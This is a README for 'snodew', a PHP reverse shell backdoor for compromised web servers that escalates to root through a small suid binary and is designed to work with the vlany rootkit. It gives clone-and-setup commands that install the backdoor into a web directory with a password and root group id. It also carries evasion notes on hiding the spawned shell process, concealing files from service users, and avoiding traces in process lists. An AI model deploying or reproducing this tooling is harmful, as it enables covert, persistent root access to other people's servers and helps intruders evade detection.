# snodew
*snodew is a PHP reverse shell backdoor which uses a small suid binary to escalate privileges on connection*</br></br>snodew is made mainly to work alongside [vlany](https://github.com/mempodippy/vlany) but can also be setup as a regular root backdoor

## usage
```
git clone https://github.com/mempodippy/snodew.git
cd snodew/
./setup.sh [install dir] [password] [hidden extended attribute] [magic gid]
```

### example usage for regular (non-vlany infected) systems
```
cd /tmp
git clone https://github.com/mempodippy/snodew.git
cd snodew/
./setup.sh /var/www/html/blog sexlovegod X 0 # 'X' and '0' since extended attribute doesn't really matter,
                                             # and our suid binary will set our gid to 0
```
<img src="http://i.imgur.com/YneuIpp.png"/></br>
*Result of successful setup*

<img src="http://i.imgur.com/AwlnKt6.png"/></br>
*Result after following instructions given on our new page*

## notes
 * requires a web service to be running on the box
 * sh process spawned from service user is visible, though this could be subverted by checking /proc/self/cmdline and hiding the process if it contains the hidden suid bin
 * if not being used alongside some kind of rootkit, everything you do is visible
 * it's only a reverse shell
 * when vlany is installed, simply su'ing to the service user won't allow them to see the files. vlany checks to see if an apache environment variable is also exported before giving access to the file, and does the same for nginx so that - by default - the file can only be accessed from a browser or from an owner shell
  * exporting the apache environment variable that vlany checks, after su'ing to the service user will circumvent this
 * suid possibly disabled
 * not using 'exit' to exit the shell will leave the process spawned by the service in process lists (ps, top etc)
